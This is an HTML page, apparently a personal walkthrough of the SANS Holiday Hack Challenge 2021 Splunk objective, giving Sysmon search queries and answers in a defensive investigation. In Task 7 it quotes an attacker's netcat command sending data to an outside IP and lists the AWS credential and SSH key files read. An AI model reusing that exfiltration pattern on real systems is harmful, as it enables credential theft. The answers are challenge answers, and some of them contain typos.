@@ -1,0 +1,1192 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.7">
+    
+    
+      
+        <title>9) Splunk - Ashish Gupta</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.cd566b2a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#task-1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Ashish Gupta" class="md-header__button md-logo" aria-label="Ashish Gupta" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Ashish Gupta
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              9) Splunk
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Ashish Gupta" class="md-nav__button md-logo" aria-label="Ashish Gupta" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Ashish Gupta
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        SANS Holiday Hack Challenge 2021
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          SANS Holiday Hack Challenge 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SANS Holiday Hack Challenge 2021" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          SANS Holiday Hack Challenge 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        Overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1%29%20KringleconOrientation/" class="md-nav__link">
+        1) KringleconOrientation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2%29%20Where%20in%20the%20world%20is%20Carmel%20Santaigo/" class="md-nav__link">
+        2) Where in the world is Carmel Santaigo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3%29%20Thaw%20Frost%20Tower%20Entrance/" class="md-nav__link">
+        3) Thaw Frost Tower Entrance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4%29%20Slot%20Machine%20Investigation/" class="md-nav__link">
+        4) Slot Machine Investigation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5%29%20Strange%20USB%20device/" class="md-nav__link">
+        5) Strange USB device
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6%29%20Shell%20Code%20Primer/" class="md-nav__link">
+        6) Shell Code Primer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7%29%20Printer%20Exploitation/" class="md-nav__link">
+        7) Printer Exploitation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8%29%20Kerberoasting%20on%20an%20Open%20Fire/" class="md-nav__link">
+        8) Kerberoasting on an Open Fire
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          9) Splunk
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        9) Splunk
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    Task 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    Task 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_1" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query_1" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_1" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3" class="md-nav__link">
+    Task 3
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_2" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query_2" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_2" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4" class="md-nav__link">
+    Task 4
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_3" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_3" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5" class="md-nav__link">
+    Task 5
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_4" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#splunk-query_3" class="md-nav__link">
+    Splunk query
+  </a>
+  
+    <nav class="md-nav" aria-label="Splunk query">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer_4" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6" class="md-nav__link">
+    Task 6
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_5" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_5" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7" class="md-nav__link">
+    Task 7
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 7">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_6" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_6" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8" class="md-nav__link">
+    Task 8
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 8">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_7" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-complete" class="md-nav__link">
+    Objective complete
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    Task 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    Task 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_1" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query_1" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_1" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3" class="md-nav__link">
+    Task 3
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_2" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#splunk-query_2" class="md-nav__link">
+    Splunk Query
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_2" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4" class="md-nav__link">
+    Task 4
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_3" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_3" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5" class="md-nav__link">
+    Task 5
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_4" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#splunk-query_3" class="md-nav__link">
+    Splunk query
+  </a>
+  
+    <nav class="md-nav" aria-label="Splunk query">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer_4" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6" class="md-nav__link">
+    Task 6
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_5" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_5" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7" class="md-nav__link">
+    Task 7
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 7">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_6" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_6" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8" class="md-nav__link">
+    Task 8
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 8">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis_7" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-complete" class="md-nav__link">
+    Objective complete
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <h1>9) Splunk</h1>
+
+<table border=1px>
+<tr>
+    <td colspan=3>
+    <b>Challenge : </b> <br>
+    Help Angel Candysalt solve the Splunk challenge in Santa's great hall. <br> 
+    Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you you complete the analysis?
+    </td>
+</tr>
+<tr>
+    <td>
+    <b>Difficulty Level : </b> <br>
+    <img src="../../images/hhc2021/difficulty_3.png" alt="drawing" width="100px"/><br>
+    </td>
+    <td>
+     <b>Location : </b> <br>
+    Great Room
+    </td>
+    <td>
+    <b>Elf/Troll : </b> <br>
+   <img src="../../images/hhc2021/image010.png" alt="drawing" width="30px"/> Angel Candysalt <br>
+    </td>
+</tr>
+</table>
+
+<table>
+<tr>
+    <td>
+    <img src="../../images/hhc2021/image114.png" alt="drawing" width="200px"/>
+    </td>
+    <td>
+        <b>Hints from Andy Candysalt </b> <br>
+        Anywho, I'm back at Santa’s Splunk terminal again this year. <br>
+        There's always more to learn!<br>
+        Take a look and see what you can find this year.<br>
+        With who-knows-what going on next door, it never hurts to have sharp SIEM skills!.<br>
+        <b>Website:</b><br>
+        <a href="https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs" target=_blank>https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs</a>
+    </td>
+<tr>
+</table>
+
+<h5 id="task-1">Task 1</h5>
+<p>Capture the commands Eddie ran most often, starting with git. <br> 
+Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.</p>
+<h6 id="analysis">Analysis</h6>
+<h6 id="splunk-query">Splunk Query</h6>
+<pre><code class="language-spl">index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=&quot;git*&quot; 
+| stats count by CommandLine 
+| sort count desc
+</code></pre>
+<p><img src="../../images/hhc2021/image114_1.png" alt="drawing" width="1200px"/></p>
+<h6 id="answer">Answer</h6>
+<p>git status</p>
+<h5 id="task-2">Task 2</h5>
+<p>Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. <br>
+The correct one!</p>
+<h6 id="analysis_1">Analysis</h6>
+<p>Referred the below article on how to add a remote repository :
+<a href="https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories" target=_blank> 
+https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories
+</a> <br>
+The git remote add command takes two arguments:</p>
+<ul>
+    <li>A remote name, for example, origin</li>
+    <li>A remote URL, for example, https://github.com/user/repo.git</li>
+</ul>
+
+<h6 id="splunk-query_1">Splunk Query</h6>
+<pre><code class="language-spl">index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi 
+CommandLine=&quot;*git remote add*&quot;
+</code></pre>
+<p><img src="../../images/hhc2021/image114_2.png" alt="drawing" width="1200px"/></p>
+<h6 id="answer_1">Answer</h6>
+<p>git remote add</p>
+<h5 id="task-3">Task 3</h5>
+<p>Eddie was running Docker on his workstation. Gather the full command line that Eddie used to bring up a the partnerapi project on his workstation.</p>
+<h6 id="analysis_2">Analysis</h6>
+<p>How to start and run the app on docker. <br></p>
+<pre><code>docker compose up
+</code></pre>
+<p>Ref : <a href="https://docs.docker.com/compose/">Docker docs</a> <br>
+"Run docker compose up and the Docker compose command starts and runs your entire app"</p>
+<h6 id="splunk-query_2">Splunk Query</h6>
+<pre><code class="language-spl">index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi Computer=&quot;emcjingles-l&quot; CommandLine=&quot;docker compose up&quot;
+</code></pre>
+<p><img src="../../images/hhc2021/image114_3.png" alt="drawing" width="1200px"/></p>
+<h6 id="answer_2">Answer</h6>
+<p>docer compose up</p>
+<h5 id="task-4">Task 4</h5>
+<p>Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. <br>
+Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. <br> 
+Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. <br>
+You will need to search outside of Splunk (try GitHub) for the original name of the repository.</p>
+<h6 id="analysis_3">Analysis</h6>
+<p>First we check how many Git repositories have been used <br></p>
+<pre><code>index=main sourcetype=github_json | stats values(repository.git_url)
+</code></pre>
+<p><img src="../../images/hhc2021/image114_4.png" alt="drawing" width="800px"/></p>
+<p>Above shows two github repositories. <br></p>
+<table>
+    <tr>
+        <th>github.com/elfnp3/partnerapi.git</th>
+        <th>github.com/elfnp3/dvws-node.git</th>
+    </tr>
+    <tr>
+        <th><img src="../../images/hhc2021/image114_5.png" alt="drawing" width="500px"/></th>
+        <th><img src="../../images/hhc2021/image114_6.png" alt="drawing" width="500px"/></th>
+    </tr>
+</table>
+
+<p>But the question is "Determine the URL of the vulnerable GitHub repository that the elves cloned for testing" <br>
+If we look at the elfnp3/dvws-node, looks like its cloned from snoopysecurity/dvws-node. <br></p>
+<p><img src="../../images/hhc2021/image114_7.png" alt="drawing" width="800px"/></p>
+<p>snoopysecurity/dvws-node is the "Damn Vulenerable Web Services" <br>
+Therefore the answer would be https://github.com/snoopysecurity/dvws-node <br></p>
+<p><img src="../../images/hhc2021/image114_8.png" alt="drawing" width="1200px"/>
+<img src="../../images/hhc2021/image114_9.png" alt="drawing" width="1200px"/></p>
+<h6 id="answer_3">Answer</h6>
+<p>https://github.com/snoopysecurity/dvws-node</p>
+<h5 id="task-5">Task 5</h5>
+<p>Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. <br> 
+Determine the name of the library and record it here for our workshop documentation.</p>
+<h6 id="analysis_4">Analysis</h6>
+<p>https://docs.npmjs.com/cli/v8/commands/npm-install<br>
+npm install <package_name> </p>
+<h5 id="splunk-query_3">Splunk query</h5>
+<pre><code>index=main eddie CommandLine=&quot;*npm install*&quot; partnerapi
+</code></pre>
+<p><img src="../../images/hhc2021/image114_10.png" alt="drawing" width="800px"/></p>
+<h6 id="answer_4">Answer</h6>
+<p>holiday-utils-js</p>
+<h5 id="task-6">Task 6</h5>
+<p>Another elf started gathering a baseline of the network activity that Eddie generated. <br>
+Start with their search and capture the full process_name field of anything that looks suspicious.</p>
+<h6 id="analysis_5">Analysis</h6>
+<p>If we look at the search provided in the task <br></p>
+<pre><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443) 
+| stats count by dest_ip dest_port
+</code></pre>
+<p>The IP address 192.30.255.113 belongs to github and It us called from the git process(usr/bin/git). <br>
+But the IP 54.175.69.219 belongs to AWS.</br>
+Most importantly It is being called from /usr/bin/nc.openbsd which can be used for making arbitrary TCP and UDP connections and listens. </br>
+[ref : <a href="https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1" target=_blank> https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1 </a><br>
+This may be a suspicious action and may be potential reverse shell.<br>
+Therefore the suspicious process name would be /usr/bon/nc.openbsd.</p>
+<p><img src="../../images/hhc2021/image114_11.png" alt="drawing" width="800px"/>
+<img src="../../images/hhc2021/image114_12.png" alt="drawing" width="800px"/></p>
+<h6 id="answer_5">Answer</h6>
+<p>/usr/bon/nc.openbsd</p>
+<h5 id="task-7">Task 7</h5>
+<p>Uh oh. This documentation exercise just turned into an investigation.<br> 
+Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. <br> One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do!<br> 
+Determine the number of files that were accessed by a related process and record it here.</p>
+<h6 id="analysis_6">Analysis</h6>
+<p>Searching for the "/usr/bin/nc.openbsd" process  <br></p>
+<pre><code>index=main process_name=&quot;/usr/bin/nc.openbsd&quot;
+</code></pre>
+<p>We see command line nc.openbsd ran the commandline "nc -q1 54.175.69.219 16842". <br>
+Which means it connects to the IP address 54.175.69.219 on port 16842.<br>
+The parent process here is 6788. <br>
+<img src="../../images/hhc2021/image114_13.png" alt="drawing" width="800px"/></p>
+<p>Now if we look for ParentProcessId 6788. <br></p>
+<pre><code>index=main ParentProcessId=6788
+</code></pre>
+<p>We see 6 files being red via /usr/bin/cat <br></p>
+<ol>
+    <li>/home/eddie/.aws/credentials</li> 
+    <li>/home/eddie/.ssh/authorized_keys</li>  
+    <li>/home/eddie/.ssh/config</li>  
+    <li>/home/eddie/.ssh/eddie</li>  
+    <li>/home/eddie/.ssh/eddie.pub</li>  
+    <li>/home/eddie/.ssh/known_hosts</li> 
+</ol>
+
+<p>So, the answer is 6. <br>
+<img src="../../images/hhc2021/image114_14.png" alt="drawing" width="800px"/>
+<img src="../../images/hhc2021/image114_15.png" alt="drawing" width="800px"/></p>
+<h6 id="answer_6">Answer</h6>
+<p>6</p>
+<h5 id="task-8">Task 8</h5>
+<p>Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.<br> 
+Determine the number of files that were accessed by a related process and record it here.</p>
+<h6 id="analysis_7">Analysis</h6>
+<pre><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational user=eddie process=&quot;*bash*&quot; CommandLine=&quot;/bin/bash *&quot; | table CommandLine
+</code></pre>
+<p>From sysmon process creation data, there is only one bash script which got executed. <br>
+<img src="../../images/hhc2021/image114_16.png" alt="drawing" width="800px"/></p>
+<pre><code>(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine=&quot;*.sh&quot;  ParentCommandLine=&quot;/bin/sh&quot;)
+OR
+(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 process_name=&quot;/bin/sh&quot;)
+| fields ProcessId,ProcessID,ProcessGuid,CommandLine,process_current_directory,dest
+| stats values(ProcessId) as ProcessId values(ProcessID) as ProcessID  values(CommandLine) as CommandLine values(process_current_directory) as process_current_directory  values(dest) as dest by ProcessGuid
+</code></pre>
+<p><img src="../../images/hhc2021/image114_17.png" alt="drawing" width="800px"/>
+<img src="../../images/hhc2021/image114_18.png" alt="drawing" width="800px"/></p>
+<h4 id="objective-complete">Objective complete</h4>
+<p>On submitting answer to the task 8, we get the below text : <br>
